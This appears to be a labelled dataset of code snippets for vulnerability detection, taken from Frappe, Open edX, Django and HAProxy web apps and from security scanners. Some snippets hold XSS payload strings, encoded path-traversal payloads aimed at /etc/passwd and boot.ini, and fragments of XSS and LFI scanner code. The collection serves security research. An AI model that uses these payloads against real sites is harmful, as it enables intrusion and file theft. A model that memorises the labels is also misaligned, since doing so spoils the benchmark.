\t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t", "label": 0}, {"snippet_id": 49097, "code": " is_ordered(self): return self.column_id in self.current_columns def is_reverse(self): for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"):", "label": 0}, {"snippet_id": 41653, "code": "] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr", "label": 0}, {"snippet_id": 5768, "code": "(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math", "label": 0}, {"snippet_id": 39910, "code": ".in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t", "label": 0}, {"snippet_id": 46624, "code": " class BenefitOverview(TemplateView): template_name='core/benefit_overview.html' def get_context_data(self): data=super().get_context_data() data['life_conditions']=LifeCondition.objects.with_benefits(", "label": 0}, {"snippet_id": 43835, "code": "/ default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new", "label": 0}, {"snippet_id": 34597, "code": "\t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t", "label": 0}, {"snippet_id": 42050, "code": ")(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\",", "label": 0}, {"snippet_id": 50342, "code": " client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) return '\"\"' def mode_input(self, request): \"\"\" This is called by render_POST", "label": 0}, {"snippet_id": 15483, "code": "', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit", "label": 0}, {"snippet_id": 4713, "code": "', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart',", "label": 0}, {"snippet_id": 43135, "code": ".meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: ", "label": 0}, {"snippet_id": 48038, "code": " except Exception as e: return redirect(\"/admin?error=\" +str(e)) return redirect(\"/admin/users\") def handle_file(u: Profile, headline: str, category: str, text: str, file): m: Media=Media() upload_base_path", "label": 0}, {"snippet_id": 7097, "code": ".auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/", "label": 0}, {"snippet_id": 2979, "code": ".insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\"", "label": 0}, {"snippet_id": 4398, "code": " % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self", "label": 0}, {"snippet_id": 48703, "code": " reservation and returnes the required resonse. \"\"\" u: Profile=get_current_user(request) if \"rid\" in request.GET: if \"srid\" in request.GET: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" ", "label": 0}, {"snippet_id": 50588, "code": "=='close': return self.mode_close(request) elif dmode=='keepalive': return self.mode_keepalive(request) else: return '\"\"' class AjaxWebClientSession(session.Session): \"\"\" This represents a session running", "label": 0}, {"snippet_id": 33083, "code": ".tail='\\n' toc_aux=ElementTree.SubElement(toc_node, 'div',{'class': 'toc-aux'}) toc_aux.text='\\n' toc_aux.append(ul_with_the_desired_toc_entries) toc_aux.tail='\\n' if __name__=='__main__': sys.exit(main", "label": 0}, {"snippet_id": 42450, "code": ".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self", "label": 0}, {"snippet_id": 20982, "code": ".ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items():", "label": 0}, {"snippet_id": 47929, "code": ") auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations=int(request.POST[", "label": 1}, {"snippet_id": 49020, "code": "(self.get_value()) ) class SmartListItem(object): def __init__(self, smart_list, object): self.smart_list=smart_list self.object=object def fields(self): return[ SmartListField(self, column, self.object)", "label": 0}, {"snippet_id": 30304, "code": " import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \ttry: \t\tresponse", "label": 0}, {"snippet_id": 3253, "code": " host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s", "label": 0}, {"snippet_id": 49885, "code": ", \"what is my purpose\", \"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit at", "label": 1}, {"snippet_id": 668, "code": " headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update=", "label": 1}, {"snippet_id": 53553, "code": ": job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name']", "label": 0}, {"snippet_id": 5913, "code": " def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel", "label": 0}, {"snippet_id": 19346, "code": " name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override:", "label": 1}, {"snippet_id": 42622, "code": ".set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype", "label": 0}, {"snippet_id": 7171, "code": "\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i", "label": 0}, {"snippet_id": 6062, "code": " 'userdb_mongo_uri': None, 'userdb_mongo_database': None, 'sso_session_lifetime': '15', 'sso_session_mongo_uri': None, 'raven_dsn': None, 'content_packages':[], 'verify_request_signatures': '0', 'status_test_usernames", "label": 0}, {"snippet_id": 42151, "code": "]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time", "label": 0}, {"snippet_id": 54337, "code": " values=[\"On\", \"Off\"]) global crawl crawl=ttk.Combobox(main, values=[\"On\", \"Off\"]) target.grid(row=0, column=1) target.config(width=30) cookie.grid(row=1, column=1) cookie.config(width=30) method.grid(row", "label": 0}, {"snippet_id": 11464, "code": "{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6", "label": 0}, {"snippet_id": 3166, "code": "(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\"", "label": 0}, {"snippet_id": 17124, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading", "label": 0}, {"snippet_id": 6835, "code": "'max_authn_failures_per_month') @property def login_state_ttl(self): \"\"\" Lifetime of state kept in IdP login phase. This is the time, in minutes, a user has to complete the login phase. After this time, login", "label": 0}, {"snippet_id": 48225, "code": ".http import HttpRequest, HttpResponseRedirect from..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation from.magic import get_current_user import json import datetime", "label": 0}, {"snippet_id": 42650, "code": "(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\",", "label": 0}, {"snippet_id": 15379, "code": "'coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir", "label": 0}, {"snippet_id": 34512, "code": "'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type", "label": 0}, {"snippet_id": 46891, "code": " @property async def n_likes(self): return(await self.stats).love_count class CommentMixin: async def add_comment(self, user_id, content, ref_id=0): obj=await Comment.create(github_id=user_id, post_id=self", "label": 0}, {"snippet_id": 12165, "code": "]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook", "label": 1}, {"snippet_id": 33210, "code": "(build_id) except ValueError as ex: self.response.write(ex.message) self.abort(400) build=model.Build.get_by_id(build_id) can_view=build and user.can_view_build_async(build).get_result() if not can_view", "label": 1}, {"snippet_id": 43951, "code": ": \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn", "label": 0}, {"snippet_id": 47840, "code": " Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request", "label": 1}, {"snippet_id": 17442, "code": "<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 16666, "code": "+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 29996, "code": "'cert_local_dir') \tcert_path=sql.get_setting('cert_path') \t \tif not os.path.exists(cert_local_dir): \t\tos.makedirs(cert_local_dir) \t \tif form.getvalue('ssl_name') is None: \t\tprint('<div class=\"alert alert", "label": 0}, {"snippet_id": 16911, "code": "/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name", "label": 0}, {"snippet_id": 8573, "code": " name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account',", "label": 0}, {"snippet_id": 37301, "code": " tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self", "label": 0}, {"snippet_id": 7471, "code": "/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$", "label": 0}, {"snippet_id": 51317, "code": ", form, change): if 'internet_nl_api_password' in form.changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted", "label": 0}, {"snippet_id": 18439, "code": "]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name", "label": 0}, {"snippet_id": 26758, "code": "./../../boot.ini%00', '../../../../../../boot.ini%00', '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini", "label": 0}, {"snippet_id": 28366, "code": "') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>') \ttry: \t\treturn config.get(sec, var) \texcept: ", "label": 0}, {"snippet_id": 54478, "code": " django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin from django.core.paginator import EmptyPage, PageNotAnInteger, Paginator from django.http import HttpResponse from django.urls", "label": 0}, {"snippet_id": 35707, "code": "}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length", "label": 0}, {"snippet_id": 29589, "code": " kwargs.get('print_out'): \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8'", "label": 0}, {"snippet_id": 46103, "code": "'qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': json.dumps(query), 'initial': json.dumps({ 'collections':[], 'layout", "label": 1}, {"snippet_id": 7645, "code": "+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook", "label": 1}, {"snippet_id": 31390, "code": "='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@curr_con\"), \t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"", "label": 0}, {"snippet_id": 36395, "code": " display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest", "label": 0}, {"snippet_id": 11518, "code": ", name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views", "label": 0}, {"snippet_id": 30045, "code": " class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' %(serv, cert_path", "label": 0}, {"snippet_id": 8409, "code": " settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +", "label": 0}, {"snippet_id": 11421, "code": ": \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"", "label": 0}, {"snippet_id": 29637, "code": "-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\") \t\tpass def escape_html", "label": 0}, {"snippet_id": 26483, "code": "/../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc", "label": 0}, {"snippet_id": 54533, "code": "(forms.ModelForm): class Meta: model=Article fields=['title', 'category', 'content'] class CommentForm(forms.ModelForm): class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model", "label": 0}, {"snippet_id": 4996, "code": "<y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http", "label": 0}, {"snippet_id": 32629, "code": "(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code'", "label": 0}, {"snippet_id": 16087, "code": ".register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(", "label": 0}, {"snippet_id": 30752, "code": ">You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable, backend, serv, serv", "label": 0}, {"snippet_id": 29235, "code": "\" \tfull_path=path +file \tif kwargs.get('dir')==\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path", "label": 0}, {"snippet_id": 36105, "code": ":param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance", "label": 0}, {"snippet_id": 39103, "code": "],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t", "label": 0}, {"snippet_id": 25352, "code": ".scheme['fields'][i][2] output.append(widget.render(name +'_%s' % i, widget_value, final_attrs, renderer=renderer)) return mark_safe(self.format_output(output)) def format_output(self, rendered_widgets) -", "label": 0}, {"snippet_id": 50936, "code": " from django.contrib.auth.models import Group, User from django.contrib.humanize.templatetags.humanize import naturaltime from django.utils.safestring import mark_safe from django_celery_beat.admin import", "label": 0}, {"snippet_id": 31303, "code": "\t\t \t\tfor i in metric: \t\t\trep_date=str(i[5]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['server']=str(i[0]) \t\t\tmetrics[rep_date]['curr_con']=str(i[1]) \t\t\tmetrics[rep_date]['curr_ssl_con']=str(i[2]) \t\t", "label": 0}, {"snippet_id": 22705, "code": ".courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about", "label": 0}, {"snippet_id": 49286, "code": ".field_name !=\"__str__\": raise SmartListException(\"Cannot use underscore(_) variables/functions in smart lists\") try: self.model_field=self.model._meta.get_field(self.field_name) self.order_field=self.field_name", "label": 0}, {"snippet_id": 50233, "code": ".requests: self.requests[csessid].finish() del self.requests[csessid] if csessid in self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST when the client", "label": 0}, {"snippet_id": 40109, "code": "=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx", "label": 0}, {"snippet_id": 25104, "code": ".format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 43461, "code": "): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 37119, "code": " name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql", "label": 0}, {"snippet_id": 10365, "code": " suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"", "label": 0}, {"snippet_id": 37821, "code": " unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format", "label": 1}, {"snippet_id": 46338, "code": "\":\"card card-home card-column span10\"} ], 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index", "label": 0}, {"snippet_id": 32776, "code": "-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td></tr>", "label": 0}, {"snippet_id": 22296, "code": " name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,", "label": 0}, {"snippet_id": 8315, "code": " 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/", "label": 0}, {"snippet_id": 10779, "code": ".get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES", "label": 0}, {"snippet_id": 27015, "code": "+host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print \"[+] LFI check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for lfi in", "label": 0}, {"snippet_id": 53577, "code": "'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\")", "label": 0}, {"snippet_id": 39290, "code": " \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation", "label": 0}, {"snippet_id": 45222, "code": " 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission", "label": 0}, {"snippet_id": 49292, "code": " underscore(_) variables/functions in smart lists\") try: self.model_field=self.model._meta.get_field(self.field_name) self.order_field=self.field_name except FieldDoesNotExist: self.model_field=None try", "label": 0}, {"snippet_id": 38947, "code": "\t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or", "label": 0}, {"snippet_id": 44778, "code": "\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters", "label": 0}, {"snippet_id": 30613, "code": ".getvalue('viewlogs') is not None: \tviewlog=form.getvalue('viewlogs') \tlog_path=funct.get_config_var('main', 'log_path') \trows=form.getvalue('rows2') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour'", "label": 0}, {"snippet_id": 14941, "code": " be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout", "label": 0}, {"snippet_id": 52772, "code": " in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow'", "label": 0}, {"snippet_id": 30872, "code": ", \"jinja2.ext.do\"]) \ttemplate=env.get_template('compare.html') \t \toutput, stderr=funct.subprocess_execute(cmd) \ttemplate=template.render(stdout=output)\t \t \tprint(template) \tprint(stderr) \t if serv is not", "label": 0}, {"snippet_id": 54125, "code": "} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti))) print(\"=\"*25) stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True", "label": 0}, {"snippet_id": 5512, "code": "<body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1)", "label": 0}, {"snippet_id": 27154, "code": ")\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group", "label": 1}, {"snippet_id": 30376, "code": " errc) \texcept requests.exceptions.Timeout as errt: \t\tprint(\"Timeout Error:\",errt) \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\",err) \t\t \tdata=response.content \tprint", "label": 0}, {"snippet_id": 26703, "code": "'%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini", "label": 0}, {"snippet_id": 17719, "code": ">[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', ", "label": 0}, {"snippet_id": 33836, "code": "\treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog", "label": 0}, {"snippet_id": 36613, "code": " BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route", "label": 0}, {"snippet_id": 23381, "code": " 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns", "label": 0}, {"snippet_id": 34390, "code": "\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ 